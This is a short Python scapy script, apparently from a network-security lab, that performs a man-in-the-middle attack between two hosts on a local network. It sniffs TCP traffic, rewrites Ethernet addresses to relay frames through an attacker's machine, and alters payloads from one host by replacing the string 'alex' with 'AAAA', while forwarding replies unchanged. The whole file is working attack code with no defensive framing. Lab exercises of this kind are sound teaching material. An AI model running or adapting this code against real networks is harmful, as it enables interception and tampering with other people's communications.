from scapy.all import *

A_IP = "10.0.2.12"
A_MAC = "00:0c:29:33:31:2e"
B_IP = "10.0.2.10"
B_MAC = "00:0c:29:c6:b2:35"
M_MAC = "00:0c:29:b7:8f:c6"


def reply_with_spoofed_packet(packet_ethernet):
    # if (packet_ethernet[Ether].src == A_MAC):
    if (packet_ethernet[Ether].src == A_MAC and packet_ethernet[IP].src == A_IP
            and packet_ethernet[IP].dst == B_IP
            and packet_ethernet[IP][TCP].payload):

        spoofed_packet = packet_ethernet.copy()
        spoofed_packet[Ether].src = M_MAC
        spoofed_packet[Ether].dst = B_MAC

        if (type(spoofed_packet[TCP].payload) == scapy.packet.Raw):
            spoofed_packet[TCP].chksum = None

            spoofed_packet[IP][TCP].load = spoofed_packet[IP][
                TCP].load.replace(b'alex', b'AAAA').decode()

        print("packed spoofed")
        print(packet_ethernet[IP][TCP].load, spoofed_packet[IP][TCP].load)
        sendp(spoofed_packet)

    elif (packet_ethernet[Ether].src == B_MAC
          and packet_ethernet[IP].src == B_IP
          and packet_ethernet[IP].dst == A_IP):

        spoofed_packet = packet_ethernet.copy()
        spoofed_packet[Ether].src = M_MAC
        spoofed_packet[Ether].dst = A_MAC

        print("packed forwarded")
        sendp(spoofed_packet)


pkt = sniff(filter='tcp', prn=reply_with_spoofed_packet)